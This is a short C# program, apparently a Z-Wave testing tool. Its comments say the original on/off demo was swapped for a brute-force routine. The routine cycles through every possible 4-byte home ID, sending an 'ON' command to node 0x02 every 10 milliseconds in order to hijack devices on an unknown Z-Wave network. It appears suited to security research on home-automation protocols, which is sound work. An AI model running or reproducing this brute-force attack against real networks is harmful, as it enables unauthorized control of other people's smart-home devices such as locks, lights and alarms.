using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;

namespace ZWave_Tester
{
    class Program
    {

        static void Main(string[] args)
        {
         
            //Original code follows below. I am commenting it and instead invoking the BruteForce function
            //The BruteForce function brute forces 4 byte home id and only sends the ON  message. Also it 
            //modifies the delay to 10 ms
            //Modified the nodeid to be 0x02

            Program.Start_BruteFoce();

            //byte nodeId = 0x06;

            //byte level = 0xFF; // On
            //byte[] message = new byte[] { 0x01, 0x09, 0x00, 0x13, nodeId, 0x03, 0x20, 0x01, level, 0x05, 0x00 };

            //ZWavePort zp = new ZWavePort();
            //zp.Open();

            //zp.SendMessage(message);
            //Thread.Sleep(5000); // Wait for 5 seconds

            //level = 0x00; // Off
            //message = new byte[] { 0x01, 0x09, 0x00, 0x13, nodeId, 0x03, 0x20, 0x01, level, 0x05, 0x00 };
            //zp.SendMessage(message);
            //Thread.Sleep(5000); // Wait for 5 seconds

            //System.Console.ReadLine(); // Wait for the user to terminate the program

            //zp.Close();         

        }

        static void Start_BruteFoce()
        {
            //NodeId modified to 0x02
            byte nodeId = 0x02;

            byte level = 0xFF; // On

            byte[] message_without_homeid = new byte[] { nodeId, 0x03, 0x20, 0x01, level, 0x05, 0x00 };
            byte[] message = new byte[11];

            ZWavePort zp = new ZWavePort();
            zp.Open();

            for (UInt32 uiHomeId = 0; uiHomeId < UInt32.MaxValue; uiHomeId++)
            {
                byte[] byteHomeId = BitConverter.GetBytes(uiHomeId);

                //The first 4 bytes of this mesasge are homeId
                System.Array.Copy(byteHomeId, message, byteHomeId.Length);
                System.Array.Copy(message_without_homeid, 0, message, 4, message_without_homeid.Length);

               zp.SendMessage(message);

                System.Console.WriteLine("Sending message for homeId: {0}", BitConverter.ToString(byteHomeId));

                Thread.Sleep(10); // Wait for 10 milliseconds
            }

            System.Console.WriteLine("Finished sending all possible values for HomeId. Press any key to exit");
            System.Console.ReadLine(); // Wait for the user to terminate the program

            zp.Close();
        }

    }
}

